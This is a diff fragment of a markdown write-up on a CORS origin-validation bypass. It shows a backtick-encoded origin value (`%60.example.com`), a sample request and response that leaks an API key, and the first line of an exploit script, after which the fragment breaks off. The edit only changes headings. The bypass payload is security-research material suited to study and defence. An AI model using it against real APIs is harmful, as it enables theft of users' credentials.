@@ -8,7 +8,8 @@ The origin verification is flawed and can be bypassed using a backtick (`).
 ## Exploit 
 Set the origin header to `%60.example.com`
 
-### Vulnerable Implementation
+### Example
+**Vulnerable Implementation** 
 ```http
 GET /endpoint HTTP/1.1
 Host: api.example.com
@@ -21,7 +22,7 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-### Exploit
+**Exploit**  
 This exploit requires that the respective JS script is hosted at `%60.example.com`
 ```js
 var req = new XMLHttpRequest(); 
